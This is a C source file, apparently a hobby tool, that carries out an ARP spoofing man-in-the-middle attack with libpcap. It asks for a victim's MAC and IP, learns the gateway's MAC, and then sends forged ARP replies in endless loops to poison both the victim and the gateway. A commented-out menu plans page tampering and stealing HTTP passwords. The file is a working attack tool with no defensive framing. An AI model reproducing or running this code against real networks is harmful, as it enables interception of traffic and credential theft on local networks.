#include "HUAJI_head.h"
#include <pthread.h>

/* about more thread */
struct arg1 {
    pcap_t *handle;
    u_char *packet;
    int size;
} tar_arg, gate_arg;

void *retval;
pthread_t thread1, thread2, thread3;
int ret_thread1, ret_thread2, ret_thread3;
/* end */

void *startG(void *arg) {
    int i = 0;
    struct arg1 *real_arg;
    real_arg = (struct arg1 *)arg;
    while (1) {
        pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
        printf("Packet %d was sent to Gateway\n", ++i);
        sleep(2);
    }
    pthread_exit(NULL);
}

void *startV(void *arg) {
    int i = 0;
    struct arg1 *real_arg;
    real_arg = (struct arg1 *)arg;
    while (1) {
        pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
        sleep(1);
    }
    pthread_exit(NULL);
}

u_char TARGET_MAC[6]; //victim's mac
u_char ATTACKER_MAC[6]; //attacker's mac
u_char GATEWAY_MAC[6]; //gateway's mac
u_char TARGET_IP[4]; //victim's ip
u_char GATEWAY_IP[4] = {192,168,1,1}; //gateway's ip

/* get gatway's mac */
void getgateway(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {
    ethernet_header *pEther = (ethernet_header *)packet;
    loading();
    printf("The gateway's MAC address is : ");
    print_mac(pEther->SRC_mac);
    memcpy(GATEWAY_MAC ,pEther->SRC_mac, 6);
}

/* create arp packet */
void ARP_packet_build(u_char *ARPpacket, int packetsize,
u_char *dst_mac, u_char *dst_ip, u_char *src_mac, u_char *src_ip, u_short op) {
    ethernet_header ehead;
    arp_header ahead;
    memset(ARPpacket, 0, packetsize);
    
    /* about victim */
    if (op == 1) { //ARP request
        memset(ehead.DST_mac, 0xff, 6);
        memset(ahead.dest_mac, 0x00, 6);
        memset(ahead.dest_ip, 0, 4);
    }
    else { //ARP reply
        memcpy(ehead.DST_mac, dst_mac, 6);
        memcpy(ahead.dest_mac, dst_mac, 6);
        memcpy(ahead.dest_ip, dst_ip, 4);
    }
    
    /* about attacker */
    memcpy(ehead.SRC_mac, src_mac, 6);
    memcpy(ahead.src_mac, src_mac, 6);
    memcpy(ahead.src_ip, src_ip, 4);
    
    /* others */
    ehead.eth_type = htons((u_short)EPT_ARP);
    ahead.hardware_type = htons((u_short)1);
    ahead.protocol_type = htons((u_short)EPT_IPv4);
    ahead.hardware_len = (u_char)6;
    ahead.protocol_len = (u_char)4;
    ahead.arp_option = htons((u_short)op);
    
    /* get together */
    memcpy(ARPpacket, &ehead, sizeof(ehead));
    memcpy(ARPpacket + sizeof(ehead), &ahead, sizeof(ahead));
}

/* send packet */
void send_packet(pcap_t *handle, u_char *packet, int packetsize) {
    if (pcap_sendpacket(handle, packet, packetsize) != 0)
        printf("Packet send failed!\n");
}

int main(int argc, char const *argv[]) {
    
    /* definations */
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    u_int mask;
    u_int net_addr;
    char *net;
    char *real_mask;
    struct in_addr addr_net;
    pcap_t *handle;
    u_char ARPpacket[42];
    u_char ARPpacket_forgateway[42];
    struct bpf_program filter;
    int counter = 0;
    
    /* get and start device */
    dev = getdev(dev, errbuf);
    if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
        printf("%s\n", errbuf); //打印错误信息
        exit(1); //结束程序
    }
    addr_net.s_addr = net_addr;
    net = inet_ntoa(addr_net);
    printf("Opening device\n");
    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
    if (!handle) {
        printf("%s\n", errbuf);
        printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
        exit(1);
    }
    loading();

    /* get attack source */
    printf("Please enter your victim's MAC (format: aa:aa:aa:aa:aa:aa)\n");
    scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
    &TARGET_MAC[0], &TARGET_MAC[1], &TARGET_MAC[2], &TARGET_MAC[3], &TARGET_MAC[4], &TARGET_MAC[5]);
    printf("Please enter your victim's IP (format: 192.168.1.0)\n");
    scanf("%hhd.%hhd.%hhd.%hhd", &TARGET_IP[0], &TARGET_IP[1], &TARGET_IP[2], &TARGET_IP[3]);
    printf("Please enter your MAC (format: aa:aa:aa:aa:aa:aa)\n");
    scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
    &ATTACKER_MAC[0], &ATTACKER_MAC[1], &ATTACKER_MAC[2], &ATTACKER_MAC[3], &ATTACKER_MAC[4], &ATTACKER_MAC[5]);

    /* get gateway's mac */
    printf("Geting gateway's MAC\n");
    char filter_app[] = "src 192.168.1.1";
    pcap_compile(handle, &filter, filter_app, 0, *net);
    pcap_setfilter(handle, &filter);
    pcap_loop(handle, 1, getgateway, NULL);

    /* cheating gateway */
    ARP_packet_build(ARPpacket_forgateway, sizeof(ARPpacket_forgateway), GATEWAY_MAC, GATEWAY_IP, ATTACKER_MAC, TARGET_IP, 2);
    printf("Cheating gateway preparing\n");
    gate_arg.handle = handle;
    gate_arg.packet = ARPpacket_forgateway;
    gate_arg.size = sizeof(ARPpacket_forgateway);
    loading();

    /* cheating victim */
    ARP_packet_build(ARPpacket, sizeof(ARPpacket), TARGET_MAC, TARGET_IP, ATTACKER_MAC, GATEWAY_IP, 2);
    printf("Attack source preparing\n");
    tar_arg.handle = handle;
    tar_arg.packet = ARPpacket;
    tar_arg.size = sizeof(ARPpacket);
    loading();

    /* Attack */
    printf("Attack!\n");
    ret_thread1 = pthread_create(&thread1, NULL, (void *)startG, (void *)&gate_arg);
    ret_thread2 = pthread_create(&thread2, NULL, (void *)startV, (void *)&tar_arg);

    /* next step */
    /*printf("Please wait\n");
    sleep(2);
    int choose;
    printf("Now your victim's network has been broken !\n");
    printf("If you want to do something interesting, you can enter a number to choose mode.\n");
    printf("\t1: Just \"repair\" his network\n");
    printf("\t2: Add a window which says \"Big Brother is watching you!\" when he open a web page.\n");
    printf("\t3: Change all the picture in his web page to HUAJI.\n");
    printf("\t4: Get his passward in http packet.\n");
    scanf(" %d", &choose);
    switch (choose) {
        case 1: {
            
        }
    }*/
    /* before end */
    pthread_join(thread2,NULL);
    pthread_join(thread3,NULL);
    pcap_close(handle);

    return 0;
}